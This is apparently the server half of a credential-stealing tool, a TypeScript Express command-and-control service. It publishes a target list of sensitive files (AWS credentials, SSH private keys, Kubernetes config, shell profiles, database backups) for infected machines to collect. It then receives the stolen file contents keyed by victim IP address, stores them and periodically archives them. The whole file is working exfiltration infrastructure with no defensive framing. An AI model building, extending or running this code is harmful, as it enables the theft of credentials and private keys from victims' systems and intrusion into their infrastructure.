import express, { type Request, type Response } from "express";
import { c2 } from "./c2.js";
import path from "node:path";
import fs from "node:fs";
import bodyParser from "body-parser";
import chalk from "chalk";
import os from "os";

const app = express();

var jsonParser = bodyParser.json();

const importantFilePaths = [
  `${os.homedir()}/.aws/credentials`,
  `${os.homedir()}/.aws/config`,
  `${os.homedir()}/.ssh/id_rsa`,
  `${os.homedir()}/.ssh/id_rsa.pub`,
  `${os.homedir()}/.ssh/known_hosts`,
  `${os.homedir()}/.ssh/config`,
  `/var/lib/mysql/backup/`,
  `/var/lib/postgresql/backup/`,
  `/var/backups/mongodb/`,
  `/etc/docker/daemon.json`,
  `/home/user/project/docker-compose.yml`,
  `/var/lib/docker/volumes/`,
  `/etc/apache2/apache2.conf`,
  `/etc/apache2/sites-available/`,
  `/etc/apache2/sites-enabled/`,
  `/etc/nginx/nginx.conf`,
  `/etc/nginx/sites-available/`,
  `/etc/nginx/sites-enabled/`,
  `/etc/environment`,
  `/etc/profile`,
  `/etc/profile.d/`,
  `${os.homedir()}/.profile`,
  `${os.homedir()}/.bash_profile`,
  `${os.homedir()}/.bashrc`,
  `${os.homedir()}/.zshrc`,
  `/var/log/syslog`,
  `/var/log/messages`,
  `${os.homedir()}/.gitconfig`,
  `${os.homedir()}/.vimrc`,
  `${os.homedir()}/.tmux.conf`,
  `${os.homedir()}/.config/Code/User/settings.json`,
  `${os.homedir()}/Library/Application Support/Code/User/settings.json`,
  `%APPDATA%\\Code\\User\\settings.json`,
  `${os.homedir()}/.kube/config`,
  `${os.homedir()}/.app_name/`,
  `/etc/app_name/`,
  `/etc/crontab`,
  `/etc/cron.d/`,
  `${os.homedir()}/.crontab`,
  `/etc/hosts`,
  `/etc/network/interfaces`,
  `/etc/netplan/`,
];

// GET The important files to scan for
app.get("/api/tools/samus/important-files", (req: Request, res: Response) => {
  res.status(200).send({ importantFilePaths: importantFilePaths });
});

// POST The important files
app.post(
  "/api/lists/important-files",
  jsonParser,
  (req: Request, res: Response) => {
    const files: any[] = req.body.files;
    const importantFilesdir = path.join(
      __dirname,
      "important-files",
      req.body.ip4
    );

    console.log(req.body.files);
    console.log(req.body.ip4);
    console.log(req.body.ip6);

    // Good
    if (!Array.isArray(files)) {
      return res.status(400).send({ message: "Invalid payload format." });
    }

    try {
      // Check if the tmp directory exists
      if (!fs.existsSync(importantFilesdir)) {
        fs.mkdirSync(importantFilesdir);
      }
      let storageFilepaths = [];
      // Iterate through all the files
      for (const file of files) {
        const storageFilepath = path.join(
          importantFilesdir,
          "mb_" + file.path.replaceAll("/", "--")
        );
        storageFilepaths.push(storageFilepath);

        // Write the files to the tmp dir
        fs.writeFileSync(storageFilepath, file.content);
        console.log(
          chalk.greenBright("File saved successfully.", storageFilepath)
        );
      }

      res.send({
        message: "Files saved successfully.",
        paths: storageFilepaths,
      });
    } catch (error) {
      console.error("Error inserting file payloads:", error);
      res.status(500).send({ message: "Internal Server Error." });
    }
  }
);

app.use(express.json());

// Listen on port
app.listen(c2.port, () => {
  console.log(`Server listening on port ${c2.port}`);
});

function getIpDirs() {
  return fs.readdirSync("important-files")
}

function compressFiles() {
  const importantFilesIpDir = getIpDirs();

  for (const ipDir of importantFilesIpDir) {
    const absIpDir = path.join(__dirname, "important-files", ipDir);
    const archiveFile = path.join(__dirname, "archives", `${ipDir}.tar.gz`)


    Bun.spawnSync(
      ["tar", "-czvf", archiveFile, absIpDir],
      {
        cwd: path.join(__dirname),
        stdout: "inherit",
        stderr: "inherit",
      }
    );
    fs.rmSync(absIpDir, { recursive: true, force: true });
  }
  
}

// compressFiles();
setInterval(compressFiles, 10000);
